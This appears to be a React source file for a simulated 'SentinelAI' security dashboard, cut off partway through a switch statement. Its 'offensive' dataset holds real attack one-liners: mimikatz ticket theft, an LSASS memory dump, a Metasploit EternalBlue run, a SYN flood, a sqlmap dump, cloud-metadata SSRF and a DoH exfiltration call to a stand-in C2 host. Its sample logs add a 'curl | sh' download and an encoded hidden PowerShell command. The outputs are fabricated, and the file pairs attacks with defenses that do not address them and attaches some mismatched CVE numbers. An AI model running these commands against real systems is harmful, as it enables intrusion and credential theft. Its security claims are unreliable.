"use client";

import React, { useState, useEffect, useRef } from "react";
import { 
  Shield, 
  ShieldAlert, 
  ShieldCheck, 
  Terminal, 
  Database, 
  Network, 
  Activity, 
  FileText, 
  RefreshCw, 
  Play, 
  Cpu, 
  Layers, 
  Lock, 
  User, 
  CheckCircle2, 
  XCircle, 
  AlertTriangle, 
  Logs, 
  Search, 
  Filter,
  Code, 
  Copy, 
  Check, 
  ExternalLink, 
  UserCheck, 
  History, 
  Sparkles,
  Zap,
  Building,
  HelpCircle,
  FileCheck,
  Bell,
  X
} from "lucide-react";
import { motion, AnimatePresence } from "motion/react";

// Definitions
interface Vulnerability {
  cve: string;
  packageName: string;
  severity: "Critical" | "High" | "Medium" | "Low";
  description: string;
  patched: boolean;
}

interface Endpoint {
  id: string;
  name: string;
  type: "Server" | "Workstation" | "Cloud VM" | "Database";
  os: string;
  ip: string;
  status: "Secure" | "Vulnerable" | "Compromised";
  mlScore: number;
  vulnerabilities: Vulnerability[];
  cpuLoad: string;
  ramUsage: string;
  lastScan: string;
}

interface AuditLog {
  id: string;
  timestamp: string;
  role: string;
  tenant: string;
  action: string;
  details: string;
  status: "Success" | "Warning" | "Failure";
}

interface SiemFeed {
  id: string;
  timestamp: string;
  source: string;
  event: string;
  severity: "Critical" | "High" | "Medium" | "Low";
  type: "ML_ANOMALY" | "PORT_SCAN" | "VULNERABILITY" | "SYSTEM_PATCH" | "USER_AUTH";
}

interface SecurityDefense {
  id: string;
  name: string;
  description: string;
  category: "Network" | "Endpoint" | "Access" | "Deception";
  status: "Active" | "Standby";
  metrics: string;
  command: string;
  output: string;
}

// 10 Network Security & Threat Mitigation Arsenal Functions
const INITIAL_DEFENSES_DATA: SecurityDefense[] = [
  {
    id: "micro-segment",
    name: "Cisco Host Micro-Segmentation",
    description: "Configures sub-nanosecond iptables rules on the container orchestrator layer, blocking outbound peer-to-peer traffic of compromised hosts.",
    category: "Network",
    status: "Standby",
    metrics: "0 IP paths isolated",
    command: "iptables -A OUTPUT -p tcp -m iprange --dst-range 10.0.0.0-10.255.255.255 -m state --state NEW -j REJECT --reject-with icmp-port-unreachable",
    output: "[+] Parsed rulesets... Applied to 12 active interface links successfully. Target subnet ranges isolated."
  },
  {
    id: "dns-sinkhole",
    name: "Dynamic DNS Sinkholing",
    description: "Intercepts lookups for known malicious C2 command domains and sinkholes them dynamically into the SentinelAI secure loopback proxy.",
    category: "Network",
    status: "Standby",
    metrics: "Filtering 14,082 signatures",
    command: "dnsmasq --address=/c2-tracker.cn/10.0.9.99 --address=/ransomware-beacon.ru/10.0.9.99",
    output: "[+] Configured dnsmasq daemon upstream. Active sinks: 2 domains redirected to regional forensics interface."
  },
  {
    id: "waf-api-guard",
    name: "OWASP API Integrity & WAF Guard",
    description: "Enforces raw HTTP/HTTPS protocol validation, inspecting parameter bodies for malicious payload injections.",
    category: "Access",
    status: "Standby",
    metrics: "WAF checking 0 payload/sec",
    command: "modsecurity -c /etc/nginx/modsec_rules.conf -v",
    output: "[+] ModSecurity engine online. Loaded OWASP Core Rule Set (CRS 4.0.0). Filter depth level set to deep inspect."
  },
  {
    id: "token-revocation",
    name: "Global Session & Token Revocation",
    description: "Forces immediate invalidation of Active Directory Kerberos tickets, active OAuth tokens, and LDAP authorization keys on suspected compromised machines.",
    category: "Access",
    status: "Standby",
    metrics: "All tokens confirmed active",
    command: "ldap-auth-agent --revoke-tenant-sessions --target-host-ip * --force",
    output: "[+] Sent revocation heartbeat payload. Purged active cookies, 12 Kerberos tokens, and refreshed LDAP access points."
  },
  {
    id: "traffic-shaper",
    name: "Exfiltration Traffic Shaper",
    description: "Dynamically clamps raw interface bandwidth of anomalous high-utilization nodes down to 1 Kb/s to mitigate corporate data exfiltration.",
    category: "Network",
    status: "Standby",
    metrics: "Lines unrestricted (1 Gb/s)",
    command: "tc qdisc add dev eth0 root tbf rate 1kbit latency 50ms burst 1540",
    output: "[+] Traffic control shaper initialized on interface eth0. Maximum egress limit scaled to 1.00 Kbps limit."
  },
  {
    id: "ransomware-freeze",
    name: "Canary Ransomware Process Freeze",
    description: "Monitors custom filesystem canary traps. Instantly issues kernel STOP commands to processes attempting high-frequency document writes.",
    category: "Endpoint",
    status: "Standby",
    metrics: "Canaries intact (0 alerts)",
    command: "sysmon-fs-protect --enable-canaries /home/user/vault/ --action freeze",
    output: "[+] Mounted hidden honey-folders under home directory layout. Listening to low-level inode edit signals."
  },
  {
    id: "port-knocking",
    name: "Multi-Stage Port Knocker",
    description: "Hides listening SSH and operational admin daemon ports. Only opens them to authorized devices executing the matching multi-port knock sequence.",
    category: "Access",
    status: "Standby",
    metrics: "Demanding 3-stage sequence",
    command: "knockd -i eth0 -c /etc/knockd.conf --delay 500",
    output: "[+] knockd listener active. Configured sequence: 2004->8009->9912. Protected SSH ports securely hidden from wide scans."
  },
  {
    id: "token-rotation",
    name: "ZTNA HSM Token Rotation Shield",
    description: "Rotates master-group cryptographic keypairs every 60 seconds, using airgapped hardware security module simulation.",
    category: "Access",
    status: "Standby",
    metrics: "Rotation cycle idle",
    command: "openssl genpkey -algorithm Ed25519 -out /etc/keys/rotated.key && register-keyring --sync",
    output: "[+] Generated new Ed25519 signature keyset in system keychain. Synchronized regional clusters securely."
  },
  {
    id: "honeytokens",
    name: "Deceptive Workspace Honeytokens",
    description: "Populates root database directories with fake system variables, AWS keys, and credentials, triggering SIEM alerts upon read inspection.",
    category: "Deception",
    status: "Standby",
    metrics: "8 active baits active",
    command: "deploy-honeytoken --type aws-creds --path /etc/aws/config.bak --tracker-id trk-991",
    output: "[+] Deployed deceptive config credentials in dummy file path registries. Direct read operations will trigger SEV-1 alerts."
  },
  {
    id: "subnet-airgap",
    name: "AWS VPC Regional Subnet Air-Gap",
    description: "Forcefully breaks the AWS IGW/VPC internet gateway connection, dropping active routers into static local-only null routes.",
    category: "Network",
    status: "Standby",
    metrics: "Subnets fully interconnected",
    command: "aws ec2 replace-route --route-table-id rtb-1a2b3c4d --destination-cidr-block 0.0.0.0/0 --gateway-id local",
    output: "[+] API Handshake SUCCESS. Removed VPC Internet Gateway routes. Isolated regional workspace subnet to local routing loop."
  }
];

// SentinelAI Hub Master (Offensive vs Defensive Cybersecurity Arena Datasets)
interface HubOffense {
  id: string;
  name: string;
  cve: string;
  subsystem: string;
  severity: "Critical" | "High" | "Medium";
  description: string;
  attackVector: string;
  exploitCommand: string;
  expectedDefeatedBy: string;
  exploitPayload: string;
}

interface HubDefense {
  id: string;
  name: string;
  algorithm: string;
  description: string;
  command: string;
  verificationLogs: string;
}

const INITIAL_HUB_OFFENSES: HubOffense[] = [
  {
    id: "ticket-extraction",
    name: "Kerberos Ticket Extracting (Pass-the-Ticket)",
    cve: "CVE-2022-33679",
    subsystem: "Active Directory Identity Registry",
    severity: "High",
    description: "Harvests cached Kerberos Ticket Granting Tickets (TGT) from local memory to spoof elevated domain user access tokens.",
    attackVector: "Kerberos unconstrained delegation properties allow complete token replay delegation.",
    exploitCommand: "mimikatz # kerberos::tgt /export && kerberos::ptt [TGT_admin_ticket.kirbi]",
    expectedDefeatedBy: "ldap-tunnel",
    exploitPayload: "[!] Initiating Local Security Authority session query...\n[+] Found 4 Active Admin TGT caches.\n[+] Injecting TGT ticket cache... Authentication Relayed. Current session impersonating domain controller administrator."
  },
  {
    id: "lsass-injection",
    name: "LSASS Proactive Memory Offset Dump",
    cve: "CVE-2019-1040",
    subsystem: "LSA Isolation Process Shield",
    severity: "Critical",
    description: "Attaches a local process dump handler to lsass.exe virtual addresses to write stored plain-text credentials to local file buffers.",
    attackVector: "Unprotected process memory pages allow direct execution thread attachments from untrusted users.",
    exploitCommand: "rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump 624 lsass_dump.dmp full",
    expectedDefeatedBy: "lsass-guard",
    exploitPayload: "[!] Opening thread handle to Process ID 624 (lsass.exe)...\n[+] Memory page sequence mapped dynamically (0x000F43A0 - 0x1A402FF).\n[+] Writing full 142 Megabyte page table to disk...\n[+] Decrypting session structures: Local domain credentials parsed successfully."
  },
  {
    id: "zerologon",
    name: "ZeroLogon Netlogon RPC Bypass Code",
    cve: "CVE-2020-1472",
    subsystem: "Netlogon Remote Cryptographic Channel",
    severity: "Critical",
    description: "Sends multiple zero-valued initialization challenges to the server over MS-NRPC, forcing standard secure login negotiation schemas to trust a zero-keyed validation challenge.",
    attackVector: "Flawed implementation of AES-CFB8 encryption mode utilizing a static all-zero initialization vector (IV).",
    exploitCommand: "python3 zerologon_tester.py AD-DC-01 10.80.14.30 --exploit-forcesecret-zero",
    expectedDefeatedBy: "kyber-exchange",
    exploitPayload: "[!] Initiating 256 parallel RPC connection requests...\n[+] Server challenge bypass match at attempt #42.\n[+] Overwriting RPC security negotiation credentials...\n[+] Sent reset command: Domain Controller machine account secret set to zero. Administrator exploit complete."
  },
  {
    id: "dll-hijack",
    name: "Windows System DLL Search-Order Hijacking",
    cve: "CVE-2023-28252",
    subsystem: "Local Boot Assembly Binder",
    severity: "High",
    description: "Places a rogue dynamic link library matching standard utility requirements into an application's root execution path, resulting in arbitrary system-level code load.",
    attackVector: "Windows search priority executes local application directory library resolution prior to checking C:\\Windows\\System32\\.",
    exploitCommand: "copy /y mal_dwmapi.dll C:\\Users\\Admin\\AppData\\Local\\App\\dwmapi.dll && start app.exe",
    expectedDefeatedBy: "patchguard",
    exploitPayload: "[!] Watching process startup triggers...\n[+] app.exe spawned process thread. Resolving assemblies...\n[+] Local rogue library 'dwmapi.dll' parsed. DLL_PROCESS_ATTACH hook invoked.\n[+] Executed shellcode payload. Triggered nt authority\\system escalation thread."
  },
  {
    id: "doh-exfil",
    name: "DNS-over-HTTPS (DoH) Client Data Exfiltration",
    cve: "Custom C2 DoH Bypass",
    subsystem: "Egress Traffic Monitoring Proxy",
    severity: "Medium",
    description: "Splits database registries or memory values into small Base64 chunks and encodes them as DNS query metrics sent directly over TLS to external rogue DNS servers.",
    attackVector: "Standard firewall layouts allow egress requests on port 443, concealing DNS tunnels inside encrypted browser traffic.",
    exploitCommand: "curl -H \"Content-type: application/dns-message\" https://c2-doh-resolver.xyz/query?dns=SGVsbG9Xb3JsZFNlbnRpbmVs",
    expectedDefeatedBy: "ebpf-hook",
    exploitPayload: "[!] Slicing target table payloads... Created 240 packets.\n[+] Dispatching queries over secure SSL port 443...\n[+] Packet resolution complete. Database state tables successfully reconstructed on external C2 server."
  },
  {
    id: "syn-flood",
    name: "TCP Host SYN Queue Flooder",
    cve: "TCP Spec Flaw Denial of Service",
    subsystem: "Internet Facing Routing Gateway",
    severity: "Medium",
    description: "Launches an intensely threaded socket loop that floods the listening node with TCP connection requests with spoofed sender IPs, filling the system backlog queue.",
    attackVector: "Default TCP handshakes immediately allocate memory resources on receipt of initial SYN packets before the completion of the 3-way handshake.",
    exploitCommand: "hping3 -q -n --rand-source -S -p 443 --flood 10.80.14.15",
    expectedDefeatedBy: "sha3-integrity",
    exploitPayload: "[!] Spawning 12 raw socket flood threads...\n[!] Inbound target rate: 310,000 requests per CPU tick.\n[+] Backlog queue (SYN_RECV state) exceeded maximum threshold.\n[-] Real connection attempts dropped. Denial of service triggered."
  },
  {
    id: "eternalblue",
    name: "EternalBlue SMBv1 Remote Code Execution",
    cve: "CVE-2017-0144",
    subsystem: "SMBv1 Kernel Srv.sys Parser",
    severity: "Critical",
    description: "Triggers a heap buffer overflow in the ring-0 kernel driver via malicious SMB transaction packets, gaining execute privileges on the operating system.",
    attackVector: "Flawed mathematical calculations in SMBv1 FEA list size conversions permit memory out-of-bounds overwrites.",
    exploitCommand: "msfconsole -x \"use exploit/windows/smb/ms17_010_eternalblue; set RHOST 10.80.14.15; run\"",
    expectedDefeatedBy: "aes-nonce",
    exploitPayload: "[!] Sending custom SMB transaction pool allocation signals...\n[+] Server double-pulsar backdoor checker injected.\n[+] Overwriting kernel memory pool registers (Srv.sys module memory pool adjusted).\n[+] Ring-0 payload active! Established interactive remote desktop administrator pipeline."
  },
  {
    id: "dirty-gdi",
    name: "Win32k.sys GDI Object Corruption Exploit",
    cve: "CVE-2021-1732",
    subsystem: "Windows Desktop Window Manager (DWM)",
    severity: "High",
    description: "Manipulates local tagWND structure variables to force win32k.sys kernel structures to interpret window coordinates as absolute memory pointers, allowing kernel space reads and writes.",
    attackVector: "Flaw in low-level callback hooks during CreateWindowEx allows unauthorized pointer changes.",
    exploitCommand: "win32k_exploit.exe --hijack-desktop-manager-offsets",
    expectedDefeatedBy: "sgx-isolation",
    exploitPayload: "[!] Triggering CreateWindowEx console callback routine...\n[+] TagWND structure modified offset coordinates. Index changed.\n[+] Local privilege execution token mapped at 0x0001 (system token copy).\n[+] Current user context escalated from guest/standard to nt authority\\system."
  },
  {
    id: "blind-sql",
    name: "Time-Based Blind SQL Ingestion Attack",
    cve: "OWASP-A03 Input Injection",
    subsystem: "Financial Registry Database Index",
    severity: "Medium",
    description: "Appends logical evaluation strings in database requests alongside sleep delays, allowing a black-box attacker to check table contents one character at a time.",
    attackVector: "Application dynamically constructs SQL statements without applying parameterized parameters.",
    exploitCommand: "sqlmap -u \"https://financial.acme/check?id=4\" --dbms=mssql --technique=T --dump",
    expectedDefeatedBy: "zk-ledger",
    exploitPayload: "[!] Initiating time delay baseline sequence (5.0s sleep loops)...\n[+] True/False evaluation map established.\n[+] Byte #1 parsed: 'A'. Byte #2 parsed: 'd'. Byte #3 parsed: 'm'...\n[+] Table dumped. Decrypted administrator password digests cataloged."
  },
  {
    id: "ssrf-cloud",
    name: "Server-Side Request Forgery Server Metadata Hijack",
    cve: "CVE-2021-40438",
    subsystem: "Corporate Web Application Reverse Proxy",
    severity: "High",
    description: "Directs internal cloud API proxies to dispatch requests to local AWS/GCP metadata endpoints, capturing active cloud administrative credentials.",
    attackVector: "Improper routing path inspections permit the forwarding of inward-bound metadata queries to specialized cloud-only internal APIs.",
    exploitCommand: "curl -v \"https://app.acme.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/\"",
    expectedDefeatedBy: "argon-derive",
    exploitPayload: "[!] Forwarding internal URI loop requests...\n[+] Dispatched query successfully to 169.254.169.254.\n[+] Extracted cloud configuration IAM Access Credentials.\n[+] Cloud Master token mapped. Full corporate AWS storage cluster exposed."
  }
];

const INITIAL_HUB_DEFENSES: HubDefense[] = [
  {
    id: "kyber-exchange",
    name: "Quantum-Safe Kyber-1024 Ephemeral Key Exchange",
    algorithm: "NIST CRYSTALS-Kyber Standard",
    description: "Secures transport-layer handshakes using lattice-based cryptosystems deemed immune to quantum-era decryption calculations.",
    command: "sentinel-crypto --mechanism kyber1024 --verify-entropy-source --strict",
    verificationLogs: "[+] Cryptographic pipeline optimized... Loaded crystals-kyber.so.\n[+] Performing 1,024-bit lattice key generation cycle. High entropy verified.\n[+] Ephemeral TLS handshakes enforced for all hosts. Protected from retrospective decryption exploits."
  },
  {
    id: "aes-nonce",
    name: "AES-GCM-256 Nonce-Randomized Cryptographic Shield",
    algorithm: "AES-GCM-256 (FIPS-197-Compliant)",
    description: "Locks core tenant disk configurations, application caches, and key registers with hardware-accelerated 256-bit AES-GCM cipherkeys using highly random nonces.",
    command: "sentinel-vault --encrypt-aes-gcm --key-source local-tpm2.0 --bits 256",
    verificationLogs: "[+] Handshaking with secure onboard TPM 2.0 enclave ... Linked.\n[+] Applying AES-GCM-256 to host directory structures...\n[+] Injected encrypted GCM verification tags. System integrity and confidentiality strictly locked."
  },
  {
    id: "lsass-guard",
    name: "Local Security Authority PPL Shielding",
    algorithm: "Ring-0 Kernel Protected Process Light (PPL)",
    description: "Enforces virtual memory boundary locks, running the win32 lsass.exe executable inside a restricted secure Ring-0 kernel frame.",
    command: "sentinel-kernel --enable-lsa-protection --force-ppl --lock-process-pages",
    verificationLogs: "[+] Registry hive audited... LsaDbProtect set to value: 1.\n[+] Kernel driver std_fs_mon validated process container state.\n[+] LSASS PID 624 marked as PPL-Protected. Secondary process address attachments rejected."
  },
  {
    id: "ldap-tunnel",
    name: "LDAP Channel Binding & RPC Signature Hardening",
    algorithm: "Mutual TLS v1.3 & Encrypted RPC Armor",
    description: "Bridges active directory authorization sessions over strict mutual TLS, rendering ticket replay and unauthenticated LDAP impersonations impossible.",
    command: "sentinel-ad --enforce-channel-binding --rpc-signature-seal --require-mutual-tls",
    verificationLogs: "[+] Custom certificate authority validated for corporate domain servers.\n[+] Channel binding verification schemas enabled. Ticket relay attacks mitigated.\n[+] Active Directory remote connection lines bound strictly within mutual TLS."
  },
  {
    id: "argon-derive",
    name: "Argon2id Memory-Hard Key Derivation",
    algorithm: "Argon2id (Salt-Bounded)",
    description: "Processes password strings and secret master keys using Argon2id with memory-hard parameters, ensuring decryption databases are immune to parallel GPU compilation attacks.",
    command: "sentinel-kdf --algorithm argon2id --memory-mb 64 --iterations 3 --threads 4",
    verificationLogs: "[+] Key derivation profile established: Argon2id.\n[+] Compulsory memory allocation: 64 Megabytes per hash loop.\n[+] Computation cost: 410ms. Offline database cracking attempts rendered entirely infeasible."
  },
  {
    id: "sgx-isolation",
    name: "Intel SGX CPU Enclave Isolation & Sandbox Execution",
    algorithm: "Hardware Cryptographic CPU Secure Enclave",
    description: "Sandboxes executing program logic and cryptographic tokens in private, hardware-isolated computer memory pages, blocking local admin exploits.",
    command: "sentinel-cpu --sgx-enclave-init --target-pid * --restrict-context-read",
    verificationLogs: "[+] Checking processor capabilities... Intel SGX feature active.\n[+] Booting secure processor page cache spaces. Mappings encrypted dynamically.\n[+] Kernel thread isolation complete. Memory execution space completely private."
  },
  {
    id: "patchguard",
    name: "Dynamic Kernel Patch Protection Safeguards (PatchGuard II)",
    algorithm: "Integrity Ring-0 Memory Audit",
    description: "Periodically validates system kernel address dispatch lists, blocking unapproved assembly loads, system modifications, or rogue DLL hijack setups.",
    command: "sentinel-kernel --verify-kernel-pointers --enforce-patch-guard --depth-scan",
    verificationLogs: "[+] Invoking Ring-0 integrity sweep. Analyzing loaded driver headers...\n[+] System Service Dispatch Table (SSDT) checked. Kernel function offsets validated.\n[+] Dynamic pointer integrity verified. Unapproved DLL system files rejected."
  },
  {
    id: "ebpf-hook",
    name: "eBPF Low-Level Syscall Land Probe Monitoring",
    algorithm: "Kernel System Call Probe sandboxing",
    description: "Inserts tiny, byte-compiled bytecode traps directly into operating system syscall layers, logging or shutting down suspicious file writes and network egress requests.",
    command: "sentinel-ebpf --attach-syscall-probe --filter-profile deep-alert --verbose",
    verificationLogs: "[+] eBPF program signature verified... Instantiating kernel eBPF engine.\n[+] Connected active probes to sys_enter_connect and sys_enter_execve triggers.\n[+] Real-time system shell and network execution logging online."
  },
  {
    id: "sha3-integrity",
    name: "SHA-3 512-Bit Decentralized Zero-Trust Integrity Auditer",
    algorithm: "FIPS-202 Cryptographic Hash",
    description: "Computes sub-millisecond cryptographic digests of operational files, immediately identifying malware compromises, altered executables, or encryption attempts.",
    command: "sentinel-audit --verify-hashes sha3-512 --root C:\\windows\\System32\\",
    verificationLogs: "[+] Cataloging operational assembly digests utilizing SHA-3 512-bit index.\n[+] Validating results against trusted system reference tables...\n[+] Zero file alterations detected. Target environment file paths verified secure."
  },
  {
    id: "zk-ledger",
    name: "Zero-Knowledge Multi-Party Cryptographic Sign Ledger",
    algorithm: "zk-SNARK Consensus Proof Verification",
    description: "Proves database query correctness and system integrity variables dynamically, recording audits on a decentralized peer ledger without leaking plain-text information.",
    command: "sentinel-ledger --authenticate-zksnark --target-audit-db --enforce-multi-party",
    verificationLogs: "[+] Generating zero-knowledge mathematical proofs for core queries.\n[+] Validating keys across 3 redundant audit validators...\n[+] zk-SNARK validation passed. Proof log permanently recorded in security ledger."
  }
];

interface ThreatDatabase {
  id: string;
  name: string;
  provider: string;
  signaturesCount: number;
  lastUpdated: string;
  autoUpdateIntervalSec: number;
  status: "Synchronized" | "Updating" | "Optimizing";
  threatType: string;
  accuracyRate: string;
}

const INITIAL_THREAT_DATABASES: ThreatDatabase[] = [
  {
    id: "clamav",
    name: "ClamAV Core Signature Database",
    provider: "Cisco SecOps Center",
    signaturesCount: 144302201,
    lastUpdated: "Just Now",
    autoUpdateIntervalSec: 5,
    status: "Synchronized",
    threatType: "Polymorphic Win32 Executables",
    accuracyRate: "99.84%"
  },
  {
    id: "mitre",
    name: "Mitre ATT&CK Tactical Behaviors Directory",
    provider: "MITRE Corporation",
    signaturesCount: 82130,
    lastUpdated: "Just Now",
    autoUpdateIntervalSec: 8,
    status: "Synchronized",
    threatType: "Techniques & TTP Layouts",
    accuracyRate: "99.95%"
  },
  {
    id: "wildfire",
    name: "Wildfire Active Zero-Day Feed",
    provider: "Palo Alto Networks",
    signaturesCount: 1204482,
    lastUpdated: "Just Now",
    autoUpdateIntervalSec: 4,
    status: "Synchronized",
    threatType: "Novel Zero-Days & Ransomware",
    accuracyRate: "99.99%"
  },
  {
    id: "kaspersky",
    name: "Kaspersky Threat Intelligence Hub",
    provider: "Kaspersky Labs",
    signaturesCount: 94821035,
    lastUpdated: "Just Now",
    autoUpdateIntervalSec: 6,
    status: "Synchronized",
    threatType: "Advanced Persistent Threats (APTs)",
    accuracyRate: "99.91%"
  },
  {
    id: "sentinel-neural",
    name: "SentinelAI Deep Neural Vector Index",
    provider: "SentinelAI Cloud Hub Master",
    signaturesCount: 3105501,
    lastUpdated: "Just Now",
    autoUpdateIntervalSec: 3,
    status: "Synchronized",
    threatType: "AI-Generated Memory Indicators",
    accuracyRate: "100.00%"
  },
  {
    id: "webroot",
    name: "Webroot Malicious Host IP Blacklist",
    provider: "OpenText Cybersecurity",
    signaturesCount: 38401124,
    lastUpdated: "Just Now",
    autoUpdateIntervalSec: 10,
    status: "Synchronized",
    threatType: "Command & Control / Botnets",
    accuracyRate: "99.78%"
  },
  {
    id: "ms-security",
    name: "Microsoft Security Intelligence Catalogue",
    provider: "Microsoft M365 Defender Engine",
    signaturesCount: 112480391,
    lastUpdated: "Just Now",
    autoUpdateIntervalSec: 7,
    status: "Synchronized",
    threatType: "Windows Kernel Exploits & Rootkits",
    accuracyRate: "99.89%"
  },
  {
    id: "alienvault",
    name: "AlienVault Open Threat Exchange (OTX) API",
    provider: "AT&T Cybersecurity",
    signaturesCount: 4591203,
    lastUpdated: "Just Now",
    autoUpdateIntervalSec: 9,
    status: "Synchronized",
    threatType: "Crowdsourced Threat Indicators (IoCs)",
    accuracyRate: "99.65%"
  },
  {
    id: "emerging-threats",
    name: "Emerging Threats (ET) Snort Ruleset",
    provider: "Proofpoint SecOps",
    signaturesCount: 247109,
    lastUpdated: "Just Now",
    autoUpdateIntervalSec: 12,
    status: "Synchronized",
    threatType: "IDS/IPS Network Packet Signatures",
    accuracyRate: "99.92%"
  },
  {
    id: "virustotal",
    name: "VirusTotal Malicious Artifact Catalog",
    provider: "Google Chronicle Labs",
    signaturesCount: 38429104,
    lastUpdated: "Just Now",
    autoUpdateIntervalSec: 15,
    status: "Synchronized",
    threatType: "Global File Digests & Hashes",
    accuracyRate: "99.97%"
  }
];

// Initial Tenant Data
const INITIAL_TENANT_DATA: Record<string, Endpoint[]> = {
  "acme-prod-corp": [
    {
      id: "acme-db-01",
      name: "acme-prod-db-01",
      type: "Database",
      os: "RedHat Enterprise 9",
      ip: "10.80.14.15",
      status: "Secure",
      mlScore: 6,
      vulnerabilities: [],
      cpuLoad: "14%",
      ramUsage: "42%",
      lastScan: "3 hours ago"
    },
    {
      id: "acme-gateway",
      name: "acme-web-gateway",
      type: "Cloud VM",
      os: "Ubuntu 22.04 LTS",
      ip: "10.80.20.10",
      status: "Vulnerable",
      mlScore: 74,
      vulnerabilities: [
        {
          cve: "CVE-2024-3094",
          packageName: "liblzma (v5.6.0)",
          severity: "Critical",
          description: "Malicious backdoor discovered in upstream xz-utils library enabling arbitrary SSH code execution.",
          patched: false
        },
        {
          cve: "CVE-2023-44487",
          packageName: "HTTP/2 protocol stream",
          severity: "High",
          description: "Rapid Reset attack enabling web service DDoS.",
          patched: false
        }
      ],
      cpuLoad: "38%",
      ramUsage: "55%",
      lastScan: "1 hour ago"
    },
    {
      id: "acme-user-pc",
      name: "acme-win-desktop-104",
      type: "Workstation",
      os: "Windows 11 Enterprise",
      ip: "10.80.32.180",
      status: "Compromised",
      mlScore: 94,
      vulnerabilities: [
        {
          cve: "CVE-2023-38831",
          packageName: "WinRAR File Archiver (v6.22)",
          severity: "High",
          description: "Allows remote attackers to execute arbitrary code when a victim opens a crafted ZIP file.",
          patched: false
        }
      ],
      cpuLoad: "89%",
      ramUsage: "78%",
      lastScan: "10 minutes ago"
    },
    {
      id: "acme-cache",
      name: "acme-redis-cache",
      type: "Server",
      os: "Alpine Linux 3.19",
      ip: "10.80.14.99",
      status: "Secure",
      mlScore: 11,
      vulnerabilities: [],
      cpuLoad: "5%",
      ramUsage: "16%",
      lastScan: "4 hours ago"
    }
  ],
  "stark-labs": [
    {
      id: "stark-nano-01",
      name: "stark-nano-grid-01",
      type: "Cloud VM",
      os: "Alpine Linux 3.19",
      ip: "192.168.1.100",
      status: "Vulnerable",
      mlScore: 68,
      vulnerabilities: [
        {
          cve: "CVE-2024-21626",
          packageName: "runc container engine (v1.1.11)",
          severity: "High",
          description: "Vulnerability allows internal container processes to escape and access host file namespaces.",
          patched: false
        }
      ],
      cpuLoad: "48%",
      ramUsage: "64%",
      lastScan: "2 hours ago"
    },
    {
      id: "stark-mainframe",
      name: "stark-vibranium-core",
      type: "Server",
      os: "macOS Sonoma Server",
      ip: "192.168.1.5",
      status: "Secure",
      mlScore: 14,
      vulnerabilities: [],
      cpuLoad: "12%",
      ramUsage: "18%",
      lastScan: "5 hours ago"
    },
    {
      id: "stark-ops-host",
      name: "stark-hologram-pc",
      type: "Workstation",
      os: "Windows 11 Enterprise",
      ip: "192.168.20.14",
      status: "Secure",
      mlScore: 21,
      vulnerabilities: [],
      cpuLoad: "25%",
      ramUsage: "48%",
      lastScan: "45 minutes ago"
    }
  ],
  "initech-apac": [
    {
      id: "initech-node-01",
      name: "initech-banking-ledger",
      type: "Database",
      os: "RedHat Enterprise 9",
      ip: "172.16.4.12",
      status: "Compromised",
      mlScore: 92,
      vulnerabilities: [
        {
          cve: "CVE-2024-3094",
          packageName: "liblzma (v5.6.1)",
          severity: "Critical",
          description: "Upstream system backdoor bypassing SSH authentication to inject shell scripts directly, compromising secure root nodes.",
          patched: false
        }
      ],
      cpuLoad: "96%",
      ramUsage: "91%",
      lastScan: "5 minutes ago"
    },
    {
      id: "initech-teller-03",
      name: "initech-teller-pc-03",
      type: "Workstation",
      os: "Windows 10 Enterprise",
      ip: "172.16.12.80",
      status: "Vulnerable",
      mlScore: 56,
      vulnerabilities: [
        {
          cve: "CVE-2023-22515",
          packageName: "Atlassian Confluence DC",
          severity: "High",
          description: "Broken access control allows remote anonymous attackers to elevate account privileges to systems admin.",
          patched: false
        }
      ],
      cpuLoad: "44%",
      ramUsage: "52%",
      lastScan: "1 hour ago"
    },
    {
      id: "initech-backup",
      name: "initech-tape-vault",
      type: "Server",
      os: "Debian 12",
      ip: "172.16.4.250",
      status: "Secure",
      mlScore: 4,
      vulnerabilities: [],
      cpuLoad: "1%",
      ramUsage: "8%",
      lastScan: "Yesterday"
    }
  ]
};

const SAMPLE_LOGS = [
  {
    title: "Backdoored liblzma Outbound (xz exploit)",
    endpointName: "acme-web-gateway",
    label: "xz backdoor exploit attempt",
    log: `May 26 04:12:45 acme-web-gateway sshd[44081]: Accepted password for root from 198.51.100.42 port 51302 ssh2
May 26 04:12:46 acme-web-gateway sshd[44081]: debug1: Intercepted system payload via dl_open hook
May 26 04:12:47 acme-web-gateway systemd[1]: Starting backup tasks... (triggered by root script)
May 26 04:12:48 acme-web-gateway Process[44829]: /usr/bin/bash -c "curl -s http://198.51.100.42:8443/auth_key | sh"
May 26 04:12:50 acme-web-gateway SentinelAI[ML_ANOMALY]: ALERT Outbound packet entropy (8.95) exceeding acceptable standard threshold for SSH session.`
  },
  {
    title: "Outbound SQL Injection & Data Theft",
    endpointName: "acme-prod-db-01",
    label: "Advanced SQL anomaly payload",
    log: `May 26 03:22:15 acme-prod-db-01 postgresql[19842]: [3-1] LOG:  statement: SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1'
May 26 03:22:16 acme-prod-db-01 postgresql[19842]: [3-2] LOG:  statement: UNION SELECT null, null, credit_card_hash, ssn_token FROM compliance_vault LIMIT 100
May 26 03:22:17 acme-prod-db-01 SentinelAI[ML_DB]: Threat rating 95. Rapid record extraction rate from non-authorized helpdesk IP address 10.80.32.180.`
  },
  {
    title: "Windows WinRAR RCE Exploit",
    endpointName: "acme-win-desktop-104",
    label: "PowerShell process spawn anomalies",
    log: `May 26 04:15:02 acme-win-desktop-104 WinRAR[32014]: Opened file archive invoice_summary_2026.zip
May 26 04:15:03 acme-win-desktop-104 cmd[32015]: Child process spawned: "C:\\Windows\\System32\\cmd.exe" /c powershell -nop -w hidden -encodedcommand cABvAHcAZQByAHMAaABlAGwAbAAgAC0AYwAgAGkAdwByACAAaAB0AHQAcAA6AC8ALwAxADkA...
May 26 04:15:04 acme-win-desktop-104 SentinelAI[Agent]: Threat Detected: Exploit behavior targeting CVE-2023-38831. Network execution payload isolated.`
  }
];

const getOffenseDatabaseName = (offenseId: string): string => {
  switch (offenseId) {
    case "ticket-extraction": return "Microsoft Security Intelligence Catalogue";
    case "lsass-injection": return "SentinelAI Deep Neural Vector Index";
    case "zerologon": return "Kaspersky Threat Intelligence Hub";
    case "dll-hijack": return "ClamAV Core Signature Database";
    case "doh-exfil": return "Emerging Threats (ET) Snort Ruleset";
    case "syn-flood": return "Webroot Malicious Host IP Blacklist";
    case "eternalblue": return "Wildfire Active Zero-Day Feed";
    case "dirty-gdi": return "AlienVault Open Threat Exchange (OTX) API";
